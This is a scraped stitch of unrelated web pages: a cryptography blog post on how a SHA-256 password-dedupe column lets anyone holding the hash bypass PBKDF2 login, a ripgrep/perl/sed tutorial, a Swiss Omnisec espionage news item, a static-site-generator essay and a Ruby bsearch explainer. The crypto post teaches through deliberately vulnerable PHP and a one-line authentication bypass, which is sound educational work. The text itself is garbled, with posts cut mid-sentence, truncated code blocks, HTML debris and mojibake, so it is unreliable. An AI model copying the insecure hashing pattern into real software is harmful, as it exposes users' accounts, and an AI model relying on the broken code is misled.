<p>Your boss insists, “The passwords are all too long and too high-entropy to reliably attacked, even when we’re using a fast hash, so we should be able to get by with a simple hash function for deduplication purposes.”</p>



<p>So you change your code to look like this:</p>


<pre title="">&lt;?php
use ParagonIE\EasyDB\EasyDB;
use MyApp\Security\PasswordHash;

class Authentication {
    private EasyDB $db;
    public function __construct(EasyDB $db)
    {
        $this-&gt;db = $db;
        $this-&gt;pwhash = new PasswordHash('sha256');
    }
    
    public function signUp(string $username, string $password)
    {
        // New:
        $hashed = hash('sha256', $password);
        if ($db-&gt;exists(
            "SELECT count(id) FROM users WHERE pw_dedupe = ?",
            $hashed
        )) {
            throw new Exception(
               "You cannot use the same username or password as another user."
            );
        }

        // Original:
        if ($db-&gt;exists(
            "SELECT count(id) FROM users WHERE username = ?",
            $username
        )) {
            throw new Exception(
               "You cannot use the same username or password as another user."
            );
        }
        $this-&gt;db-&gt;insert('users', [
            'username' =&gt; $username,
            'pwhash' =&gt; $this-&gt;pwhash-&gt;hash($password),
            // Also new:
            'pw_dedupe' =&gt; $hashed
        ]);
    }

    public function logIn(string $username, string $password): int
    {
        // This is unchanged:
        $user = $this-&gt;db-&gt;row("SELECT * FROM users WHERE username = ?", $username);
        if (empty($user)) {
            throw new Exception("Security Error: No user");
        }
        if ($this-&gt;pwhash-&gt;verify($password, $user['pwhash'])) {
            throw new Exception("Security Error: Incorrect password");
        }
        return (int) $user['id'];
    }
}
</pre>


<p>Surely, this won’t completely undermine the security of the password hashing algorithm?</p>

<p>Three years later, a bored hacker discovers a read-only SQL injection vulnerability, and is immediately able to impersonate any user in your application.</p>



<p>What could have possibly gone wrong?</p>

<p>In order to understand what went wrong in our hypothetical scenario, you have to kinda know what’s under the hood in the monstrosity that our hypothetical developer slapped together.</p>



<h3 id="pbkdf2">PBKDF2</h3>



<p>PBKDF2 stands for <strong>P</strong>assword-<strong>B</strong>ased <strong>K</strong>ey <strong>D</strong>erivation <strong>F</strong>unction #2. If you’re wondering where PBKDF1 went, I discussed its vulnerability in another blog post about <a href="https://soatok.blog/2020/05/05/putting-the-fun-in-hash-function/">the fun we can have with hash functions</a>.</p>



<p>PBKDF2 is supposed to be instantiated with some kind of pseudo-random function, but it’s almost always HMAC with some hash function (SHA-1, SHA-256, and SHA-512 are common).</p>



<p>So let’s take a look at HMAC.</p>



<h3 id="hmac">HMAC</h3>



<p>HMAC is a Message Authentication Code algorithm based on Hash functions. Its definition looks like this:</p>







<p>For the purposes of this discussion, we only care about the definition of K’.</p>



<p>If your key (K) is larger than the block size of the hash function, it gets pre-hashed with that hash function. If it’s less than or equal to the block size of the hash function, it doesn’t.</p>



<p>So, what is PBKDF2 doing with K?</p>



<h3 id="how-pbkdf2-uses-hmac">How PBKDF2 Uses HMAC</h3>



<p>The RFCs that define PBKDF2 aren’t super helpful here, but one needs only look at <a href="https://defuse.ca/php-pbkdf2.htm">a reference implementation</a> to see what’s happening.</p>


<pre title="">// first iteration
$last = $xorsum = hash_hmac($algorithm, $last, $password, true);
// perform the other $count - 1 iterations
for ($j = 1; $j &lt; $count; $j++) {
	$xorsum ^= ($last = hash_hmac($algorithm, $last, $password, true));
}
$output .= $xorsum;
</pre>


<p>If you aren’t fluent in PHP, it’s using the previous round’s output as the message (m in the HMAC definition) and the password as the key (K).</p>



<p>Which means if your password is larger than the block size of the hash function used by HMAC (which is used by PBKDF2 under the hood), it will be pre-hashed.</p>



<h3 id="exploit">The Dumbest Exploit Code</h3>



<p>Okay, with all of that in mind, here’s how you can bypass the authentication of the above login script.</p>


<pre title="">$httpClient-&gt;loginAs(
    $user['username'],
    hex2bin($user['pw_dedupe'])
);
</pre>


<p>Since K’ = H(K) when Length(K) &gt; BlockSize(H), you can just take the pre-calculated hash of the user’s password and use that <em>as the password</em> (although not hex-encoded), and it will validate. (<a href="https://3v4l.org/nqoRI">Demo</a>.)</p>

<p>Above, when HMAC defined K’, it included a variant in its definition. Adding variants to hash function is a dumb way to introduce the risk of collisions. (See also: <a href="https://soatok.blog/2020/07/15/kerlissions-trivial-collisions-in-iotas-hash-function-kerl/">Trivial Collisions in IOTA’s Kerl hash function</a>.)</p>



<p>Also, some PBKDF2 implementations that mishandle the pre-hashing of K, which <a href="https://github.com/defuse/php-encryption/issues/230">can lead to denial-of-service attacks</a>. Fun stuff, right?</p>



<h3 id="mitigations">Some Dumb Yet Effective Mitigations</h3>



<p>Here are a few ways the hypothetical developer could have narrowly avoided this security risk:</p>



<ul><li>Use a different hash function for PBKDF2 and the deduplication check.<ul><li>e.g. PBKDF2-SHA256 and SHA512 would be impervious</li></ul></li><li>Always pre-hashing the password before passing it to PBKDF2.<ul><li>Our exploit attempt will effectively be double-hashed, and will not succeed.</li></ul></li><li>Use HMAC instead of a bare hash for the deduplication. With a hard-coded, constant key.</li><li>Prefix the password with a distinct domain separation constant in each usage.</li><li>Truncate the hash function, treating it as a Bloom filter.</li><li>Some or all of the above.</li><li><strong>Push back</strong> on implementing this stupid feature to begin with.</li></ul>



<p>Subtle problems often (<a href="https://github.com/cr-marcstevens/sha1collisiondetection">but not always</a>) call for subtle solutions.</p>



<h3>Password Security Advice, Revisited</h3>



<p>One dumb mitigation technique I didn’t include above is, “Using passwords shorter than the block size of the hash function.” The information security industry almost unanimously agrees that <a href="https://crambler.com/password-security-why-secure-passwords-need-length-over-complexity/">longer passwords are better than short ones</a> (assuming both have the same distribution of possible characters at each position in the string, and are chosen randomly).</p>



<p>But here, we have a clear-cut example where having a longer password actually <em>decreased</em> security by allowing a trivial authentication bypass. Passwords with a length less than or equal to the block size of the hash function would not be vulnerable to the attack.</p>



<p>For reference, if you ever wanted to implement this control:</p>



<ul><li>64-character passwords would be the upper limit for MD5, SHA-1, SHA-384, and SHA-512.</li><li>32-character passwords would be the upper limit for SHA-224 and SHA-256.</li></ul>



<p>But really, one of the other mitigation techniques would be better. Limiting the input length is just a band-aid.</p>



<h2 id="is-crypto-hard">Is Cryptography Hard?</h2>



<p>I’ve fielded a lot of questions in the past few weeks, and consequently overheard commentary from folks insisting that cryptography is a hard discipline and therefore only the smartest should study it. I disagree with that, but not for the reason that most will expect.</p>



<p>Many of the people reading this page will tell me, “This is such a dumb and obvious design flaw. Nobody would ship that code in production,” because they’re clever or informed enough to avoid disaster.</p>



<p>Yet, we still regularly hear about <a href="https://www.howmanydayssinceajwtalgnonevuln.com/">JWT alg=none vulnerabilities</a>. And <a href="https://arxiv.org/abs/1510.08555">Johnny still still can’t encrypt</a>. So cryptography surely can’t be <em>easy</em>.</p>







<p>Real-world cryptographic work is cognitively demanding. It becomes increasingly mathematically intensive <a href="https://soatok.blog/2020/06/10/how-to-learn-cryptography-as-a-programmer/">the deeper you study</a>, and nobody knows how to name things that non-cryptographers can understand. (Does anyone intuitively understand what a <strong>public key</strong> is outside of our field?)</p>



<p>In my opinion, cryptography is certainly challenging and widely misunderstood. There are a lot of subtle ways for secure building blocks to be stitched together insecurely. And <em>today</em>, it’s certainly a hard subject for most people to learn.</p>



<p>However, I don’t think its hardness is <strong><em>unavoidable</em>.</strong></p>



<h3 id="a-softer-crypto-world">Descending the Mohs Scale</h3>



<p>There is a lot of gatekeeping in the information security community. (Maybe we should expect that to happen when people spend too many hours staring at firewall rules?)</p>



<p>“Don’t roll your own crypto” is something you hear a lot more often from software engineers and network security professionals than bona fide cryptographers.</p>



<p><a href="https://medium.com/@soatok/gatekeeping-in-online-communities-48dec7f97f6a">Needless gatekeeping</a> does the cryptographic community a severe disservice. I’m <a href="https://www.cryptofails.com/post/75204435608/write-crypto-code-dont-publish-it">not the first</a> to suggest that, either. </p>



<p>From what I’ve seen, far too many people feel discouraged from learning about cryptography, thinking they aren’t smart enough for it. It …</p></div></div></div>

    <div>
      <p>This post shows how you can use <code>ripgrep</code> and <code>perl</code> to perform multiline fixed string search and replace operations from the command line. Solution with <code>GNU sed</code> is also discussed, along with its limitations.</p>
<h2 id="fixed-string-matching">Fixed string matching<a href="#fixed-string-matching" aria-label="Anchor link for: fixed-string-matching">🔗</a></h2>
<p>The below sample input file will be used in the examples in this post.</p>
<pre><code><span>$ cat ip.txt
This is a multiline
sample input with lots
of special characters
like . () * [] $ {}
^ + ? \ and ' and so on.
This post shows how
you can do fixed
-string multiline
search with cli tools.
</span></code></pre><h3 id="ripgrep">ripgrep<a href="#ripgrep" aria-label="Anchor link for: ripgrep">🔗</a></h3>
<p><a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> supports <code>-U</code> option to allow multiline matching. Use <code>-F</code> option to turn off regexp matching, i.e. treat the search string literally. In <code>bash</code> shell (and likely most other shells), you can press enter key to insert literal newline character for quoted values. When you do so, the next line starts with <code>&gt;</code> and a space character. This isn't shown in the examples below to make it easier to copy-paste the commands.</p>
<pre><code><span>$ rg -UF 'like . () * [] $ {}
^ + ? \ and' ip.txt
4:like . () * [] $ {}
5:^ + ? \ and ' and so on.

# -l option shows only filename instead of all the matching lines
$ rg -lUF 'like . () * [] $ {}
^ + ? \ and' ip.txt
ip.txt
</span></code></pre>
<p>You'll have an issue if your search string itself contains single quote characters. Avoid using double quotes as a workaround, as that has its own set of special characters. You can work around by concatenating multiple strings next to each other, along with escaped single quote characters as needed.</p>
<pre><code><span># -N option disables line number prefix
$ rg -NUF 'like . () * [] $ {}
^ + ? \ and '\'' and' ip.txt
like . () * [] $ {}
^ + ? \ and ' and so on.
</span></code></pre>
<p>If your search string starts with <code>-</code> character, you'll have to use <code>--</code> before the search argument.</p>
<pre><code><span>$ rg -NUF -- '-string multiline
search' ip.txt
-string multiline
search with cli tools.
</span></code></pre><h3 id="perl">perl<a href="#perl" aria-label="Anchor link for: perl">🔗</a></h3>
<p>You can use <code>-0777</code> option with <code>perl</code> to slurp the entire input as a single string. Another advantage with <code>perl</code> is that you can use files to pass the search and replace strings. Thus, you don't have to worry about any character that may clash with shell metacharacters. See my <a href="https://learnbyexample.github.io/learn_perl_oneliners/">Perl one-liners cookbook</a> if you are not familiar with using <code>perl</code> from the command line.</p>
<pre><code><span>$ cat search_1.txt
like . () * [] $ {}
^ + ? \ and ' and so on.

# display filename if the given search string matches
$ perl -0777 -nE '!$#ARGV ? $s=$_ :
                  /\Q$s/ &amp;&amp; say $ARGV' search_1.txt ip.txt
ip.txt
</span></code></pre>
<p>However, you'll have to make sure the file doesn't end with a newline if you are providing partial lines for searching, or take care of it within the <code>perl</code> script.</p>
<pre><code><span>$ cat search_2.txt
-string multiline
search

# no output because there's a newline at the end of search_2.txt file
$ perl -0777 -nE '!$#ARGV ? $s=$_ :
                  /\Q$s/ &amp;&amp; say $ARGV' search_2.txt ip.txt

# this will remove newline at the end of file before assigning to $s
$ perl -0777 -nE '!$#ARGV ? $s=s/\n\z//r :
                  /\Q$s/ &amp;&amp; say $ARGV' search_2.txt ip.txt
ip.txt
</span></code></pre>
<p>By default, <code>ripgrep</code> gives entire matching lines. To get rest of the line with <code>perl</code>, you'll have to explicitly add a pattern around the search string.</p>
<pre><code><span># $&amp; variable has the entire matching portion
$ perl -0777 -nE '!$#ARGV ? $s=s/\n\z//r :
                  /\Q$s/ &amp;&amp; say $&amp;' search_2.txt ip.txt
-string multiline
search

# use 'say $&amp; while /.*\Q$s\E.*/g' if there are multiple matches
$ perl -0777 -nE '!$#ARGV ? $s=s/\n\z//r :
                  /.*\Q$s\E.*/ &amp;&amp; say $&amp;' search_2.txt ip.txt
-string multiline
search with cli tools.

<h3 id="ripgrep-1">ripgrep<a href="#ripgrep-1" aria-label="Anchor link for: ripgrep-1">🔗</a></h3>
<p><code>ripgrep</code> also supports replacing matched string with something else using the <code>-r</code> option. By default, you'll see only matched lines in the output. Use <code>--passthru</code> option to display all the input lines, even if they do not match the given search string. See <a href="https://learnbyexample.github.io/substitution-with-ripgrep/">my blog post</a> for more details about the <code>-r</code> option and various ways you can use it for substitution requirements.</p>
<pre><code><span>$ rg --passthru -NUF 'like . () * [] $ {}
^ + ? \ and' -r '====

====' ip.txt
This is a multiline
sample input with lots
of special characters
====
----
==== ' and so on.
This post shows how
you can do fixed
-string multiline
search with cli tools.
</span></code></pre>
<p>Apart from having to workaround single quote, you'll have to use <code>$$</code> instead of <code>$</code> as it is used for backreferences in the replacement section.</p>
<pre><code><span>$ echo 'sample input' | rg --passthru -F 'in' -r '$a'
sample put
$ echo 'sample input' | rg --passthru -F 'in' -r '$$a'
sample $aput
</span></code></pre><h3 id="perl-1">perl<a href="#perl-1" aria-label="Anchor link for: perl-1">🔗</a></h3>
<p>With <code>perl</code>, you can use files for both search and replace strings. And, you can easily choose to replace first or all occurrences, unlike <code>ripgrep</code> where it always replaces all the matches.</p>
<pre><code><span>$ cat replace.txt
---------------------
$&amp; = $1 + $2 / 3 \ 4

$ perl -0777 -ne '$#ARGV==1 ? $s=$_ : $#ARGV==0 ? $r=$_ :

<p>Trailing newlines and ASCII NUL characters will be lost if you wish to save contents of a file as <code>bash</code> variables using <code>var=$(&lt; filename)</code> command. See <a href="https://stackoverflow.com/questions/7427262/how-to-read-a-file-into-a-variable-in-shell/22607352#22607352">stackoverflow: pitfalls of reading file into shell variable</a> for details.</p>

<p>If your search string doesn't have multiple trailing newlines or ASCII NUL characters, then you can save file contents to variables and then pass them to <code>ripgrep</code>. Single trailing newline will not normally cause an issue for searching operations as <code>ripgrep</code> will append a newline while displaying results anyway. If you want to make sure input file also contains the trailing newline, then you can manually concatenate a newline character to the search string.</p>
<pre><code><span>$ s=$(&lt; search_1.txt)
# use "$s"$'\n' if you want to match trailing newline as well
$ rg -NUF "$s" ip.txt
like . () * [] $ {}

# use -- if the search string starts with - character
$ s=$(&lt; search_2.txt)
$ rg -NUF -- "$s" ip.txt

</span></code></pre>
<p>For substitution operations, you'll have to preprocess the replacement file to replace <code>$</code> with <code>$$</code>.</p>
<pre><code><span>$ s=$(&lt; search_1.txt)
$ r=$(sed 's/\$/$$/g' replace.txt)

# here, removal of trailing newline doesn't cause an issue,
# as it evens out between search and replace strings

<p>Here, partial line has to be matched. So, <code>$()</code> assignment works well for the search string. If the trailing newline of the replacement string isn't needed, then <code>$()</code> assignment again is good enough. Otherwise, you can modify the replacement string as <code>-r "$r"$'\n'</code></p>

</span></code></pre><h3 id="gnu-sed">GNU sed<a href="#gnu-sed" aria-label="Anchor link for: gnu-sed">🔗</a></h3>
<p>To follow a similar approach with <code>GNU sed</code>, you'll have to preprocess the strings to escape metacharacters. Assuming input doesn't have ASCII NUL characters, you can use <code>-z</code> option to slurp entire input as a single string.</p>
<p>Here's an example for multiline search.</p>
<pre><code><span># escape all BRE metacharacters
# replace literal newlines with \n
$ s=$(sed -z 's#[[^$*.\/]#\\&amp;#g; s/\n/\\n/g' search_1.txt)

# since newlines are replaced with \n,
# trailing newlines will be preserved here
$ echo "$s"
like \. () \* \[] \$ {}\n\^ + ? \\ and ' and so on\.\n

# display filename if input matches the given multiline search string
# tr is used to change NUL character after filename to newline
$ sed -nz '/'"$s"'/F' ip.txt | tr '\0' '\n'
ip.txt
</span></code></pre>
<p>And here's an example for multiline substitution.</p>
<pre><code><span># last newline is removed here to allow partial line matching
$ s=$(sed -z 's#[[^$*.\/]#\\&amp;#g; s/\n$//; s/\n/\\n/g' search_2.txt)

# escape all replacement section metacharacters
# and prefix \ character to literal newlines, except the last line
$ r=$(sed 's:[\\/&amp;]:\\&amp;:g; $!s/$/\\/' replace.txt)
$ echo "$r"
---------------------\
$\&amp; = $1 + $2 \/ 3 \\ 4\
=====================

# if you need trailing newline from replace.txt,
# use sed -z 's/'"$s"'/'"$r"'\n/g'
$ sed -z 's/'"$s"'/'"$r"'/g' ip.txt

</time><p>According to <a rel="noopener" target="_blank" href="https://www.srf.ch/news/schweiz/verschluesselungsgeraete-geheimdienstaffaere-weitere-schweizer-firma-rueckt-in-den-fokus">SRF sources</a>, the Swiss company Omnisec AG had ties to US intelligence services. This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>

    <article>
      
      <time datetime="2020-11-09 00:00:00">November 9, 2020</time>
      <p>On the internet, there is no shortage of good quality <a href="https://jamstack.org/generators/">static site generators</a> (SSGâ€™s) that you can download for free. <a href="https://gohugo.io/">Hugo</a>, <a href="https://jekyllrb.com/">Jekyll</a>, and hundreds of others are readily available. And they work. You can build all kinds of sites with them. I know that, because Iâ€™ve used some of them. Hugo was the driving force behind this website until very recently. Despite that, when I tried to add a new section a while ago, I got rather frustrated with it and decided to build my own generator. It turned out to be a very pleasant experience and not just because I like to program things.</p>
<p>While working on it, I discovered some of the deeper motivations that drove me to undertake this project. On the surface it would seem an odd thing to do, because it takes a lot of time and it appears to offer little benefit. I did not create any new or spectacular functionality. If you click around this site and think: Hey, but I could totally make this with &lt;SSG of choice&gt;, then you would probably be right. But that is not the point. There are certain advantages to making it all yourself and I suspect that these advantages trancend the subject of SSGâ€™s and programming. My speculation is that exploring this direction might also be interesting for people who do not like to program, or maybe even for those who donâ€™t like computers that much at all.</p>
<p>So, why choose this project out so many others that all sound so much more interesting? It is easy to summarize, but without some context it may sound a bit abstract. The real reason for all this work is that I think that a personal site should be personal and to make it personal, one should solely be guided by oneâ€™s intuition and not by the mental models of available tools and the restrictions they impose on your thoughts.</p>
<p>That probably sounded vague and perhaps a little far fetched. After all, as long as you can write the words you want to write, draw the lines you want to draw, you are not limited in your creativity, right? Maybe you are. To make the point more tangible, let me expand on my own situation for a bit. I wil focus on Hugo, since that is the SSG I know best. But the same principles hold for other generators. All other tools even, I believe.</p>
<h2>Metadata and Organising Thoughts</h2>
<p>As said, the list of available static site generators is endless. But somehow they all seem to focus on <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> as markup language to write your posts in. Markdown is very easy to learn and that is probably the reason why it is so popular. Unfortunately, it is a pretty bad markup language for this use case, as it is very incomplete. It is not really a language. Markdown is better seen as a bunch of shortcuts to simplify writing a few common HTML tags. Out of the box you can only sort of markup the body of a document with it. Titles, paragraphs, lists, etc. But not more than that. As we are dealing with a website, shortcuts for HTML tags can be useful, but we need more. For instance, one also needs metadata, like tags, publishing dates, etc. You do want the latest post to be at the top of the newsfeed, right? Then we must find a way to indicate the time when a post was published.</p>
<p>In Hugo this is solved with the awkward concept of <a href="https://gohugo.io/content-management/front-matter/">frontmatter</a>. At the top of each Markdown file, one needs to add a block of text that is not Markdown, but another format. You can pick either YAML, TOML, or JSON. In that block you can specify the things I mentioned. Publishing date, author, category, etc. It is all very flexible, you can even define your own metadata. So you can definitely make a nice looking site out of this.</p>
<p>But the downside is that any blog or article you write is now tied to the system that you use to publish it. Frontmatter is not part of Markdown. It is part of Hugo. So other Markdown tools will not be able to extract that info. Only Hugo can. So if you, like me, like to write all kinds of things, and you want to have some of your writings to end up on your site and others not, a decision that is perhaps made even only after youâ€™ve done the writing, then you have just created a problem. Because now you have to make two piles of writing. One pile for texts that will be published on your site, and another for text that you want to export to, say, PDF. But wait, maybe you <em>also</em> want to compile a selection of your stories and make it into an ebook. And maybe you are really proud of a piece and you want to publish it all three ways at once. It becomes a bit weird, and also very impractical, to store your work then. Are you going to change the document format each time you want to make an export? Are you going to make multiple copies? What happens if you find a spelling error later? This all quickly becomes a big mess.</p>
<p>Ideally, I want to have one folder for storing all my writing. I want to organize that folder the way I think fits best with the content. Then I want to point the site generator to that folder and it should figure out the rest by itself. What needs to be published on my site? Where should it end up? The metadata should be all that is needed to figure it out. And I want the same thing to be true for all other publishers, generators, indexers, etc. that I use, or may want to use in the future. The only solution is then to store your texts in open, tool agnostic document format that can hold all the relevant info. Preferably a plain text format too. Because that part of Markdown I do like. Using simple text editors, Git version control, yes, give me that.</p>
<p>Enter <a href="https://asciidoc.org/">Asciidoc</a>. A Markdown so structured and complete that you can write a whole book in it. Yet is has the same simple way of adding markup and it looks very similar. I will write another post later on how I used a subset of Asciidoc to make my generator. The point I want to make here is that a simple, in my opinion very reasonable requirement to not want to be forced to reorganise and duplicate my files in an illogical way, already rules out 90% of the available tools. And, conversely, that merely by adopting one of those existing tools, you have suddenly become a bit restricted in the way you can think about your creative work.</p>
<p>Think about it. The moment you start anything, the moment where the ideas in your head are not more than undefined glimpses of images or feelings. The moment you have to concentrate really hard to not let the fleeting, still wordless impressions slip. Blink your eyes one time too many and they will be lost, floated away. On <em>that</em> very moment, you get bothered by the question â€œWhere should this end up, once it is finished? Is it a note for my diary, or a book?â€�  That is totally backwards. That should not be the first question about your work, but the last. Not everyone is the same, but for me this upfront question is limiting. Thoughts that are not mature enough to be categorized, are forced to materialize in anyway, so you can put them in the right bucket. And then they slip away.</p>
<h2>Blank Page Instead of Puzzles and Pieces</h2>
<p>By now, some pepole might be thinking: yes, that is all fine, but some generators, like Hugo <em>can</em> use Asciidoc as input and you <em>can</em> set an alternative content path. Surely you can work something out here and configure things the way it suits you?</p>
<p>Well, yes, from the face of it, it might be possible to cobble something up. But that is not going to end up well. Going that route, you will get dragged down in an endless cycle of figuring out options and options of options and in the end, you will be happy to get anything on the screen at all.</p>
<p>Letâ€™s start simple. Some generators say they support Asciidoc, but they donâ€™t do that nativly. At least the ones Iâ€™ve seen. That is, you have to install another piece of software to get the functionality. In this case <a href="https://asciidoctor.org/">Asciidoctor</a>. (And Asciidocter in turn requires Ruby, but I think it ends there.) Then the two pieces must be configured to work together and this must be done on overy device you want to use. This is what developers call a dependency and they are to be avoided wherever possible, as they require you to do work, just to keep things running as they are. At the time of writing you can read <a href="https://gohugo.io/content-management/formats/#additional-formats-through-external-helpers">this</a> in the Hugo documentation on how to configure Asciidoc:</p>
<p><em>â€œAsciiDoc implementation EOLs in Jan 2020 and is no longer supported. AsciiDoc development is being continued under Asciidoctor. The format AsciiDoc remains of course. Please continue with the implementation Asciidoctor.â€�</em></p>
<p>So what this says is that the people behind Hugo saw that a piece of software they relied on, AsciiDoc, was going to be outdated so they switched to another piece of external software, Asciidoctor, to prevent things from breaking. A sensible move. But for you, the user, things are now already broken, because now you have remove the first piece of software, install the second, and configure things again to make them work together. And again, this must be done on all your devices. You get to choose between options, but the options are not stable and require work by you, the user. Sometimes the options have some dependencies themselves, repeating the problem. Not a fun way to spend an afternoon.</p>
<p>But enough about Asciidoc. Letâ€™s talk about templates.</p>
<p>It is wellknown that Hugo has a difficult templating language. This is because Hugo is built in Go and leverages the <a href="https://golang.org/pkg/html/template/">template functionality</a> of the Go standard library. That functionality is fast and elegant, but very much geared to programmers. I knew this beforehand, but since I am a Go developer, I figured this would be an advantage, not a disadvantage. I do this Go stuff all day. It has payed for the laptop I am writing on right now and the chair I am sitting in. Surely this will be easy?</p>
<p>Not so much. Writing Hugo templates turned out to be a moderately frustrating experience. It was an endless game of guessing variables, types and trying to combine them into something useful by chaining functions. There is documentation, every variable and function is listed, but a crucial thing is missing: the big …</p></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>What’s the midpoint between 0 and infinity? Well the answer differs depending on whether you are asking a mathematician, philosopher, or a Ruby developer. I’m not a mathematician or a philosopher, but I am a Ruby developer, so I can tell you than 1.5 is the midpoint between 0 and infinity.</p>  <p><a href="https://ruby-doc.org/core-2.7.2/Range.html#method-i-bsearch"><code>Range#bsearch</code></a> performs binary search within a range. For example, lets use it to find the first integer that’s larger than 42 (which is 43) and see the values it inspects to find it.</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The integer larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>And when we run it, we get the following output:</p> <div><div><pre><code>The integer larger than 42 is: 43
The following values were inspected:
1
2
4
8
16
32
64
32
48
40
44
42
43
</code></pre></div></div> <p>We see typical binary search behavior.</p> <p>A co-worker recently asked me about some odd behavior when we change the starting value to a float. For example, consider the following code, which is the same as the one above but the range is between 0 and <code>Float::INFINITY</code>:</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>Float</span><span>::</span><span>INFINITY</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The float larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>We then get the following output when we run it (note that the output has been truncated because it’s too long):</p> <div><div><pre><code>The float larger than 42 is: 42.00000000000001
The following values were inspected:
1.5
1.6759759912428246e+154

42.424560546875
42.1746826171875
...
</code></pre></div></div> <p>The first few values we inspect in the binary search are rather odd: <code>1.5</code>, <code>1.6759759912428246e+154</code>, <code>1.5921412270130977e+77</code>, etc. Where do these numbers come from? To explain these values, we first have to understand how IEEE 754 floating-point numbers work.</p>  <p>Ruby floats are double-precision IEEE 754 floating-point numbers. If you don’t know the basics about how floating-point numbers are represented in memory, there are plenty of resources on the internet, <a href="https://fabiensanglard.net/floating_point_visually_explained/">here’s one</a>.</p> <p>Of special interest to us is how infinity is represented in floating-point. Infinity is a special value where the exponent bits are all 1’s and the significand bits (also known as fraction or mantissa) are all 0’s.</p>  <p>Ruby’s <code>Range#bsearch</code> is implemented in a C function called <a href="https://github.com/ruby/ruby/blob/5512de76033773a77f686f3cb2adc849356f7674/range.c#L680"><code>range_bsearch</code></a>. There are several cases it deals with, and the one of interest is the case when either endpoint is a float. In this case, it performs a clever trick. It reads the C double type of the Ruby float endpoints as 64-bit integers (<code>int64_t</code>)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Note that this is <strong>not</strong> the same as casting the double into integer type, this is directly reading the double as a 64-bit integer. Are you confused? I sure was when I first read this code so if you are too, it’ll make more sense later on. Trust me.</p> <p>Let’s revisit how infinity is represented in floating-point. Here’s it visualized (through the help of the amazing website <a href="https://float.exposed/">float.exposed</a>). We can see that the sign is 0 (this is a positive value), all exponent bits are 1, and all significand bits are 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/infinity.png"> </figure> <p>And of course, <code>0</code> is represented in floating-point with all the bits set to 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/zero.png"> </figure> <p>So what if we read these bits of the endpoint as if they were integers? Then our range would be between <code>0</code> and <code>9218868437227405312</code>. What’s the midpoint of this range? It’s <code>4609434218613702656</code>. Now let’s plug this value back into <a href="https://float.exposed/0x3ff8000000000000">float.exposed</a>.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/one_point_five.png"> </figure> <p>Oh look, it’s 1.5!</p> <p>Using this same technique, you can now find out why the binary search examines <code>1.6759759912428246e+154</code> and <code>1.5921412270130977e+77</code> after this. This is left as an exercise for the reader.</p>  <p>The reason why this works is simple once you wrap your head around it. It’s because the more significant bits are always in a more significant position (than the bits to the right of it) in floating-point numbers. This is obviously true for the significand. But this is also true for the exponent because the next power of 2 can’t be reached by just increasing the significand, the exponent has to be increased. So thus a larger exponent will always mean that the floating-point number has a larger magnitude.</p> <p>Once this is true, we can see why binary search works using this technique. It works because if <code>x</code> and <code>y</code> are doubles and <code>x &gt; y</code>, then we have shown that <code>double_as_int64(x) &gt; double_as_int64(y)</code> is also true. This is the requirement for binary search because the values remain strictly increasing (<em>technically</em> binary search only requires monotonically increasing, but strictly increasing is a tighter guarantee than monotonically increasing).</p>  <p>Ruby’s binary search in a range uses a clever technique to perform binary search when the endpoints are doubles while maintaining a worst-case runtime of <code>O(n log n)</code>. In fact, this technique isn’t 